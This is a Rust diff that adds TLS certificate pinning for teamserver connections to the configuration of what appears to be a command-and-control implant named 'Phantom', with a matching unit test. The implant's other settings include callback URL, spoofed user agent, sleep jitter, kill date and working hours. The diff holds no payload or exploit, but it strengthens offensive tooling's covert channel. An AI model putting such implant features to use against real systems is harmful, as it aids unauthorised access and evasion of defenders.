@@ -11,6 +11,12 @@ pub struct PhantomConfig {
     pub callback_url: String,
     /// Optional listener init secret used for HKDF session key derivation.
     pub init_secret: Option<String>,
+    /// PEM-encoded certificate to pin for TLS connections to the teamserver.
+    ///
+    /// When set, only the teamserver presenting this certificate (or one signed by it) is
+    /// trusted. When `None`, the system CA store is used instead.  Configured at runtime via
+    /// the `PHANTOM_PINNED_CERT_PEM` environment variable.
+    pub pinned_cert_pem: Option<String>,
     /// HTTP user agent sent with callbacks.
     pub user_agent: String,
     /// Base sleep interval in milliseconds.
@@ -75,7 +81,7 @@ impl PhantomConfig {
             "Environment:\n",
             "  PHANTOM_CALLBACK_URL, PHANTOM_INIT_SECRET, PHANTOM_USER_AGENT,\n",
             "  PHANTOM_SLEEP_DELAY_MS, PHANTOM_SLEEP_JITTER, PHANTOM_KILL_DATE,\n",
-            "  PHANTOM_WORKING_HOURS\n",
+            "  PHANTOM_WORKING_HOURS, PHANTOM_PINNED_CERT_PEM\n",
         )
     }
 
@@ -109,6 +115,9 @@ impl PhantomConfig {
                 }
                 Some("PHANTOM_WORKING_HOURS") => {
                     self.working_hours = Some(parse_os_value(&value, "PHANTOM_WORKING_HOURS")?);
+                }
+                Some("PHANTOM_PINNED_CERT_PEM") => {
+                    self.pinned_cert_pem = Some(parse_os_string(value, "PHANTOM_PINNED_CERT_PEM")?);
                 }
                 _ => {}
             }
@@ -175,6 +184,7 @@ impl Default for PhantomConfig {
         Self {
             callback_url: String::from("https://127.0.0.1:40056/"),
             init_secret: None,
+            pinned_cert_pem: None,
             user_agent: String::from(
                 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
             ),
@@ -260,6 +270,27 @@ mod tests {
         assert_eq!(config.kill_date, Some(1_700_000_000));
         assert_eq!(config.working_hours, Some(255));
         assert_eq!(config.init_secret.as_deref(), Some("sekrit"));
+        assert!(config.pinned_cert_pem.is_none());
+    }
+
+    #[test]
+    fn from_sources_applies_pinned_cert_pem_from_env() {
+        let config = PhantomConfig::from_sources(
+            ["phantom"],
+            [
+                ("PHANTOM_CALLBACK_URL", "https://teamserver.local/"),
+                (
+                    "PHANTOM_PINNED_CERT_PEM",
+                    "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n",
+                ),
+            ],
+        )
+        .expect("config");
+
+        assert_eq!(
+            config.pinned_cert_pem.as_deref(),
+            Some("-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n")
+        );
     }
 
     #[test]
